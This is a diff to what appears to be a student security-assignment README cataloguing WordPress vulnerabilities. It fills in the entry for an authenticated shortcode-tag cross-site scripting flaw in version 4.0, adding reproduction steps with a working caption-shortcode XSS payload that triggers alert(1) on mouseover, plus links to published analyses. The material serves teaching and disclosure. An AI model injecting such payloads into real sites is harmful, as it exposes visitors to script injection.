@@ -8,15 +8,19 @@ Time spent: **X** hours spent in total
 
 1. (Required) Vulnerability Name or ID 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
   - [X] Summary: 
-    - Vulnerability types:
+    - Vulnerability types:XSS
     - Tested in version:4.0
     - Fixed in version: 4.3
   - [X] GIF Walkthrough:
     <img src='Clickme.gif' title='Clickme XSS' width='' alt='' />
     
-  - [ ] Steps to recreate: 
-  - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+  - [X] Steps to recreate: 
+    -add a new post
+    -insert ```TEST!!![caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'">Click me</a>``` on the    context
+    -publish and view post
+  - [X] Affected source code:
+    - [Link 1](http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/)
+    - [Link 2](http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/)
 1. (Required) Vulnerability Name or ID
   - [ ] Summary: 
     - Vulnerability types:
